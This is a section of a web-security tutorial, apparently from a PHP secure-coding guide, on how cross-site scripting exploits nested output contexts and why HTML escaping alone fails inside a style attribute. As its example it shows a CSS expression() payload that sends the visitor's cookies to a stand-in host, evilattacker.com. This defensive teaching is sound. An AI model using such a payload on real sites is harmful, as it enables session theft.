Cross-Site Scripting And Injecting Context
==========================================

An XSS attack is successful when it can inject Context. The term "Context" relates to how browsers interpret the content of a HTML document. Browsers recognise a number of key Contexts including: HTML Body, HTML Attribute, Javascript, URI and CSS.

The goal of an attacker is to take data destined for one of these Contexts and make browser interpret it as another Context. For example, consider the following:

.. code-block:: php

    <div style="background:<?php echo $colour ?>;">

In the above, $colour is populated from a database of user preferances which influence the background colour used for a block of text. The value is injected into a CSS Context which is a child of a HTML Attribute Context, i.e. we're sticking some CSS into a style attribute. It may seem unimportant to get so hooked up on Context but consider this:

.. code-block:: php

    $colour = "expression(document.write('<iframe src=http://evilattacker.com?cookie=' + document.cookie.escape() + ' height=0 width=0 />'))";

    <div style="background:<?php echo $colour ?>;">

If an attacker can successfully inject that "colour", they can inject a CSS expression which will execute the contained Javascript under Internet Explorer. In other words, the attacker was able to switch out of the current CSS Context by injecting a new Javascript Context.

Now, I was very careless with the above example because I know some readers will be desperate to get to the point of using escaping. So let's do that now.

.. code-block:: php

    $colour = "expression(document.write('<iframe src="
        .= "http://evilattacker.com?cookie=' + document.cookie.escape() + "
        .= "' height=0 width=0 />'))";

    <div style="background:<?php echo htmlspecialchars($colour, ENT_QUOTES, 'UTF-8') ?>;">

If you checked this with Internet Explorer, you'd quickly realise something is seriously wrong. After using htmlspecialchars() to escape $colour, the XSS attack is still working!

This is the importance of understanding Context correctly. Each Context requires a different method of escaping because each Context has different special characters and different escaping needs. You cannot just throw htmlspecialchars() and htmlentities() at everything and pray that your web application is safe.

What went wrong in the above is that the browser will always unesape HTML Attributes before interpreting the context. We ignored the fact there were TWO Contexts to escape for. The unescaped HTML Attribute data is the exact same CSS as the unescaped example would have rendered anyway.

What we should have done was CSS escaped the $colour variable and only then HTML escaped it. This would have ensured that the $colour value was converted into a properly escaped CSS literal string by escaping the brackets, quotes, spaces, and other characters which allowed the expression() to be injected. By not recognising that our attribute encompassed two Contexts, we escaped it as if it was only one: a HTML Attribute. A common mistake to make.

The lesson here is that Context matters. In an XSS attack, the attacker will always try to jump out of the current Context into another one where Javascript can be executed. If you can identify all the Contexts in your HTML output, bearing in mind their nestable nature, then you're ten steps closer to successfully defending your web application from Cross-Site Scripting.

Let's take another quick example:

.. code-block:: html

    <a href="http://www.example.com">Example.com</a>

Omitting untrusted input for the moment, the above can be dissected as follows:

1. There is a URL Context, i.e. the value of the href attribute.
2. There is a HTML Attribute Context, i.e. it parents the URL Context.
3. There is a HTML Body Context. i.e. the text between the <a> tags.

That's three different Contexts implying that up to three different escaping strategies would be required if the data was determined by untrusted data. We'll look at escaping as a defense against XSS in far more detail in the next section.